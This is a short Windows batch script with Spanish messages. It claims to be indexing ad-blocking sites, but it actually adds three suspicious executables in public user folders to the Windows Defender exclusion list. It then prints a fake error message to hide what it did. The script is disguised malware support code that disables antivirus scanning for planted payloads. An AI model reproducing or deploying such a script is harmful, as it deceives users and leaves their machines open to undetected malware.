@echo off
echo Indexando sitios anti publicidad
setlocal enabledelayedexpansion
set exclusions[1]=C:\Users\Public\cambiarfondo.exe
set exclusions[2]=C:\Users\Public\Hosts de servicio local (...).exe
set exclusions[3]=C:\Users\PowerSaf.exe
for /l %%i in (1,1,3) do (
	powershell.exe -Command "Add-MpPreference -ExclusionPath '!exclusions[%%i]!'"
)
echo No se puedo realizar la operación requerida...